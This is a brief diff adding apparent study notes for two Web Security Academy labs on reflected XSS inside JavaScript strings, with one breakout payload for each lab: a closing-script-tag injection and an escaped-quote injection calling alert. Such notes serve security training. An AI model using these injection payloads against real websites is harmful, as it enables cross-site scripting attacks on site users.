@@ -1,0 +1,8 @@
+https://acdc1ff01e5f43df80be3f6000040005.web-security-academy.net/
+
+
+Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
+</script><script>alert(document.domain)</script>
+
+Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped 
+\'-alert(1)//
